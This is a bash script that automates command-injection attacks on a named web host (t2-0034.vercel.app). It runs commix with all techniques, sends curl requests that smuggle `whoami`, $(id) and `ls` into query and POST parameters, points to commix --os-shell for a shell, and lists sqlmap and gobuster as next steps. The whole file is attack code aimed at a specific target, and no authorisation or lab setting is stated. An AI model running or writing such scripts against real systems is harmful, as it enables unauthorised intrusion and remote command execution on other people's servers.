#!/bin/bash
# Quick and guaranteed working commix command for t2-0034.vercel.app
# This uses only flags that work on all commix versions

clear
echo "╔════════════════════════════════════════════════════════════╗"
echo "║    COMMIX EXPLOITATION - GUARANTEED WORKING VERSION        ║"
echo "║    Target: https://t2-0034.vercel.app/                     ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Check if commix exists
if ! command -v commix &> /dev/null; then
    echo "[!] Commix not installed. Installing..."
    sudo apt update && sudo apt install -y commix
fi

echo "[*] Starting commix scan..."
echo "[*] This will take 5-10 minutes"
echo ""

# Create results directory
mkdir -p t2_0034_results
cd t2_0034_results

# THE WORKING COMMAND (no --verbose, no --crawl if not supported)
echo "[*] Running comprehensive scan..."
commix --url="https://t2-0034.vercel.app/" --all --batch --output-dir=./results 2>&1 | tee scan.log

echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                    SCAN COMPLETE                           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Check results
if grep -qi "vulnerable" scan.log || grep -qi "injection" scan.log; then
    echo "[!!!] POTENTIAL VULNERABILITY FOUND!"
    echo ""
    grep -i "vulnerable\|injection" scan.log | head -20
    echo ""
    echo "[*] To exploit, run:"
    echo "    commix --url='VULNERABLE_URL_FROM_ABOVE' --os-shell"
else
    echo "[*] No command injection found by automated scan"
    echo ""
    echo "[*] Trying manual tests..."
    echo ""
    
    # Manual curl tests
    echo "[1] Testing basic injection..."
    curl -s "https://t2-0034.vercel.app/?cmd=\`whoami\`" > test1.html
    if grep -qi "root\|www-data\|vercel" test1.html; then
        echo "[!!!] Possible command execution detected!"
        cat test1.html
    else
        echo "[*] No obvious response"
    fi
    
    echo ""
    echo "[2] Testing API endpoint..."
    curl -s "https://t2-0034.vercel.app/api/test?param=\$(id)" > test2.html
    if grep -qi "uid=\|gid=" test2.html; then
        echo "[!!!] Command execution confirmed!"
        cat test2.html
    else
        echo "[*] No command execution"
    fi
    
    echo ""
    echo "[3] Testing POST injection..."
    curl -s -X POST "https://t2-0034.vercel.app/api/test" -d "cmd=\`ls\`" > test3.html
    if [ -s test3.html ]; then
        echo "[*] Response received:"
        head -20 test3.html
    fi
fi

echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                  RECOMMENDATIONS                           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "1. Check scan.log for detailed results"
echo "2. If no command injection, try:"
echo "   - SQL injection: sqlmap -u 'https://t2-0034.vercel.app/'"
echo "   - Directory brute: gobuster dir -u https://t2-0034.vercel.app/ -w /usr/share/wordlists/dirb/common.txt"
echo "   - Manual testing with Burp Suite"
echo ""
echo "Results saved in: $(pwd)"
echo ""

cd ..
